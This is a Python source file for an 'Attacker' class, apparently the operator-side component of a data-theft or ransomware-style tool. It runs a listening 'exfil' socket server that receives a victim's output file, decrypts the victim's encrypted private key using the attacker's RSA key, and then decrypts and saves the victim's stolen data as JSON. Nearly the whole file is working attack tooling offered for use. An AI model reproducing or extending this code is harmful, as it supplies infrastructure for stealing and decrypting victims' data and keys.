from attacker_modules.encryption import *
import rsa
import json
import socket 

class Attacker:

    def __init__(self, victims_output_file):
        self.victim_keyfile = ""
        self.victims_output_file = victims_output_file

    def start_exfil_server(self):
        """
        a method that connects to the server laptop to retrieve the
        """ 
        host = '127.0.0.1'
        port = 9000
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((host, port))
            s.listen(1)
            print(f"Server listening on {host}:{port}...")

            conn, addr = s.accept()
            print(f"Connected by {addr}")

            with open(self.victims_output_file, "wb") as file:
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    file.write(data)
            print("File received successfully")

    def decrypt_victim_key(self):
        """
        this function decrypts the victims encrypted private key and adds it to a file called private_key_victim_ID.pem
        """
        self.victim_keyfile ="private_key_victim_" + (self.victims_output_file.split('_')[1]).strip(".txt") + ".pem"

        

        print("loading attacker private key...")
        encryption_attacker = Encryption("ATCK3R", "public_attacker.pem", "private_attacker.pem")
        #load both keys
        encryption_attacker.load_private_key()

        print("reading output file...")
        with open(self.victims_output_file, "rb") as infile:
            
            lines = infile.readlines()
        

        for i, line in enumerate(lines):
            
            if b"private key(encrypted)" in line:
                print("encryption key found...")
                start_index =  i + 2 #this is the starting line of the encrypted key
                end_index = lines.index(b"---\n", start_index) #the end index is the next "---" separator
                print("extracting key")
                encrypted_private_key = b"".join(lines[start_index:end_index])[:-1] #rejoin the lines between the 2 indexes
        
        print('decrypting key...')

        
        victim_private_key = encryption_attacker.decrypt(encrypted_private_key)

        print("victim private keyfile generated under: "+ self.victim_keyfile)
        with open(self.victim_keyfile, "wb") as private_keyfile:
            private_keyfile.write(victim_private_key.encode("utf-8"))
        

    def decrypt_victim_data(self):
        """
        this function uses the decrypted victim key
        """
        if self.victims_output_file != "":
            print("loading victims private encryption key")
            decrypt_victim = Encryption("","", self.victim_keyfile)
            decrypt_victim.load_private_key()
            
            print("reading output file")
            with open(self.victims_output_file, "rb") as infile:
                
                lines = infile.readlines()

            for i, line in enumerate(lines):
                
                if b"victims encrypted data" in line:
                    print("data found!")
                    start_index =  i + 2

                    print("extracting victims data...")
                    encrypted_victim_data = b"".join(lines[start_index:]) #rejoin the lines between the 2 indexes
                    print(encrypted_victim_data)
                    print("decrypting data")
                    decrypted_victim_data = decrypt_victim.decrypt(encrypted_victim_data)

                    outfile = "victim_"+(self.victims_output_file.split('_')[1]).strip(".txt") +".json"
                    print(f"writing extracted data to {outfile}...")

                    decrypted_victim_data = json.loads(decrypted_victim_data)
                    
                    with open(outfile, "w") as json_file:
                        json.dump(decrypted_victim_data, json_file, indent=4)

                else:
                    print("trying...")

        else:
            print("output file not set")

    






